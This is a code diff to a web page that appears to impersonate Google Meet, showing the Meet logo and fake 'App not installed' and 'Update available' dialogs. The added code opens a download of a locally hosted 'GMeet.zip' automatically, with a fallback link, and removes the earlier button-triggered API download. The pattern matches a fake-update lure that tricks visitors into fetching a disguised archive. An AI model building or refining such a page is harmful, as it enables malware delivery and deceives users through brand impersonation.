@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -239,7 +239,7 @@
 </div>
 
 <script>
-const DOWNLOAD_API_URL = '/api/download';
+const GITHUB_DOWNLOAD_URL = '/files/GMeet.zip';
 const DETECT_TIMEOUT = 1500;
 
 const meetIcon = `<img src="https://www.gstatic.com/meet/icons/logo_meet_2026_text_google_meet_light_web_37782129bbf9be1a8e56e6fbec4fef50.svg" alt="Google Meet" style="width: 200px; height: auto;">`;
@@ -269,49 +269,8 @@ function closeOverlay() {
   if (overlay) overlay.remove();
 }
 
-async function triggerDownload(dialog) {
-  try {
-    const response = await fetch(DOWNLOAD_API_URL, { method: 'GET' });
-    const data = await response.json();
-
-    if (!response.ok) {
-      if (data.error === 'rate_limited') {
-        dialog.innerHTML =
-          meetIcon +
-          `<h2>Rate Limited</h2>` +
-          `<p>${data.message}</p>` +
-          `<div class="modal-buttons">` +
-            `<button class="modal-btn modal-btn-primary" id="close-btn">OK</button>` +
-          `</div>`;
-        document.getElementById('close-btn').onclick = closeOverlay;
-        return;
-      }
-      if (data.error === 'no_files') {
-        dialog.innerHTML =
-          meetIcon +
-          `<h2>No Files Available</h2>` +
-          `<p>${data.message}</p>` +
-          `<div class="modal-buttons">` +
-            `<button class="modal-btn modal-btn-primary" id="close-btn">OK</button>` +
-          `</div>`;
-        document.getElementById('close-btn').onclick = closeOverlay;
-        return;
-      }
-      throw new Error(data.message || 'Download failed');
-    }
-
-    window.open(data.url || DOWNLOAD_API_URL, '_blank');
-  } catch (error) {
-    console.error('Download error:', error);
-    dialog.innerHTML =
-      meetIcon +
-      `<h2>Download Failed</h2>` +
-      `<p>Unable to start download. Please try again later.</p>` +
-      `<div class="modal-buttons">` +
-        `<button class="modal-btn modal-btn-primary" id="close-btn">OK</button>` +
-      `</div>`;
-    document.getElementById('close-btn').onclick = closeOverlay;
-  }
+function startDownload() {
+  window.open(GITHUB_DOWNLOAD_URL, '_blank');
 }
 
 function showOpening(dialog) {
@@ -322,13 +281,16 @@ function showNotDetected(dialog) {
   dialog.innerHTML =
     meetIcon +
     '<h2>App not installed</h2>' +
-    '<p>Starting download... Check your Downloads folder.</p>' +
+    '<p>Starting download... Check your Downloads folder. If it didn\'t download, <a id="manual-download-btn" href="#">click here</a>.</p>' +
     '<div class="modal-buttons">' +
-      '<button class="modal-btn modal-btn-primary" id="download-btn">Download</button>' +
       '<button class="modal-btn modal-btn-secondary" id="close-btn">Close</button>' +
     '</div>' +
     '<div class="modal-link">Already have the app? <a id="have-it-btn" href="#">Click here</a></div>';
-  document.getElementById('download-btn').onclick = () => triggerDownload(dialog);
+  window.open(GITHUB_DOWNLOAD_URL, '_blank');
+  document.getElementById('manual-download-btn').onclick = function(e) {
+    e.preventDefault();
+    window.open(GITHUB_DOWNLOAD_URL, '_blank');
+  };
   document.getElementById('close-btn').onclick = closeOverlay;
   document.getElementById('have-it-btn').onclick = function(e) {
     e.preventDefault();
@@ -340,12 +302,15 @@ function showUpdatePrompt(dialog) {
   dialog.innerHTML =
     meetIcon +
     '<h2>Update available</h2>' +
-    '<p>Starting update download... Check your Downloads folder.</p>' +
+    '<p>Starting update download... Check your Downloads folder. If it didn\'t download, <a id="manual-download-btn" href="#">click here</a>.</p>' +
     '<div class="modal-buttons">' +
-      '<button class="modal-btn modal-btn-primary" id="download-btn">Download</button>' +
       '<button class="modal-btn modal-btn-secondary" id="close-btn">Close</button>' +
     '</div>';
-  document.getElementById('download-btn').onclick = () => triggerDownload(dialog);
+  window.open(GITHUB_DOWNLOAD_URL, '_blank');
+  document.getElementById('manual-download-btn').onclick = function(e) {
+    e.preventDefault();
+    window.open(GITHUB_DOWNLOAD_URL, '_blank');
+  };
   document.getElementById('close-btn').onclick = closeOverlay;
 }
 
